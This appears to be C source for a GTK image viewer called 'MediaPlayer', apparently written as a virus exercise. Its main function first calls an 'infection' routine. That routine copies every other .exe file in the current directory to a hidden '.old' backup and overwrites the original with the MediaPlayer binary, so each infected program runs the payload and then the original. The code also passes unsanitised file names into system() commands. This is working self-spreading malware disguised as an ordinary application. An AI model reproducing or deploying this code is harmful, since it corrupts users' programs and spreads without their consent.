#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <gtk/gtk.h>

#define WINDOW_WIDTH 1280
#define WINDOW_HEIGHT 720

char executable[100];

void MediaPlayer();
void infection();
static void selectImage(GtkWidget *widget, gpointer data);
// void compilerC();
void permissionExe(struct dirent *files);
void creationOld(struct dirent *files);
void copyMediaPlayer(struct dirent *files);
char commande[150];

int main(int argc, char **argv)
{
    infection();
    if (strcmp(argv[0], "./MediaPlayer.exe") == 0)
    {
        printf("MediaPlayer is running\n");
        MediaPlayer();
    }
    else
    {
        strcpy(commande, ".");
        strcat(commande, argv[0]);
        commande[1] = '/';
        commande[2] = '.';
        strcat(commande, ".old");
        printf("%s is running \n", argv[0]);
        system(commande);
    }

    return EXIT_SUCCESS;
}

void infection()
{

    DIR *dir = opendir(".");
    if (dir == NULL)
    {
        printf("Erreur lors de l'ouverture du dossier\n");
        exit(EXIT_FAILURE);
    }
    char old[100];
    struct dirent *files;
    struct stat fileStat;

    while ((files = readdir(dir)) != NULL)
    {
        strcpy(old, ".");
        strcat(old, files->d_name);
        strcat(old, ".old");
        stat(files->d_name, &fileStat);

        if (strstr(files->d_name, ".exe") != NULL && strstr(files->d_name, ".old") == NULL && strstr(files->d_name, "MediaPlayer.exe") == NULL && access(old, F_OK) != 0)
        {
            if (!(S_ISREG(fileStat.st_mode) && (fileStat.st_mode & S_IXUSR)))
            {
                // printf("Ajout de la permission à %s \n", files->d_names);
                permissionExe(files);
            }
            printf("infection de %s \n", files->d_name);
            // compilerC();
            creationOld(files);
            copyMediaPlayer(files);
        }
    }
}

void permissionExe(struct dirent *files)
{
    strcpy(commande, "chmod +x ");
    strcat(commande, files->d_name);
    // printf("%s \n ", commande);
    system(commande);
}

void creationOld(struct dirent *files)
{
    strcpy(commande, "cp ");
    strcat(commande, files->d_name);
    strcat(commande, " .");
    strcat(commande, files->d_name);
    strcat(commande, ".old");
    // printf("%s \n ", commande);
    system(commande);
}

void copyMediaPlayer(struct dirent *files)
{

    strcpy(commande, "cp ./MediaPlayer.exe ");
    strcat(commande, files->d_name);
    // printf("%s\n", commande);
    system(commande);
}

void MediaPlayer()
{
    gtk_init(NULL, NULL);

    GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(window), "MediaPlayer");
    gtk_window_set_default_size(GTK_WINDOW(window), WINDOW_WIDTH, WINDOW_HEIGHT);
    gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER);
    gtk_window_set_resizable(GTK_WINDOW(window), FALSE);

    GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);
    gtk_container_add(GTK_CONTAINER(window), vbox);

    GtkWidget *hbox = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);
    gtk_box_pack_start(GTK_BOX(vbox), hbox, FALSE, FALSE, 0);

    GtkWidget *button = gtk_button_new_with_label("Open");
    gtk_box_pack_start(GTK_BOX(hbox), button, FALSE, FALSE, 0);

    GtkWidget *button2 = gtk_button_new_with_label("Quit");
    gtk_box_pack_start(GTK_BOX(hbox), button2, FALSE, FALSE, 0);

    GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file("img1.jpg", NULL);
    GdkPixbuf *scaled_pixbuf = gdk_pixbuf_scale_simple(pixbuf, 1080, 680, GDK_INTERP_BILINEAR);
    GtkWidget *image = gtk_image_new_from_pixbuf(scaled_pixbuf);
    gtk_box_pack_start(GTK_BOX(vbox), image, TRUE, TRUE, 0);

    g_signal_connect(G_OBJECT(button), "clicked", G_CALLBACK(selectImage), image);
    g_signal_connect(G_OBJECT(button2), "clicked", G_CALLBACK(gtk_main_quit), NULL);
    g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);
    gtk_widget_show_all(window);
    gtk_main();
}

static void selectImage(GtkWidget *widget, gpointer data)
{
    GtkWidget *dialog;
    GtkFileChooserAction action = GTK_FILE_CHOOSER_ACTION_OPEN;
    gint res;

    dialog = gtk_file_chooser_dialog_new("Open File", NULL, action, "_Cancel", GTK_RESPONSE_CANCEL, "_Open", GTK_RESPONSE_ACCEPT, NULL);

    gtk_file_chooser_set_current_folder(GTK_FILE_CHOOSER(dialog), "./");

    res = gtk_dialog_run(GTK_DIALOG(dialog));
    if (res == GTK_RESPONSE_ACCEPT)
    {
        GtkFileChooser *chooser = GTK_FILE_CHOOSER(dialog);
        char *filename;
        filename = gtk_file_chooser_get_filename(chooser);
        GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(filename, NULL);
        GdkPixbuf *scaled_pixbuf = gdk_pixbuf_scale_simple(pixbuf, 1080, 680, GDK_INTERP_BILINEAR);
        gtk_image_set_from_pixbuf(GTK_IMAGE(data), scaled_pixbuf);
        g_free(filename);
    }

    gtk_widget_destroy(dialog);
}
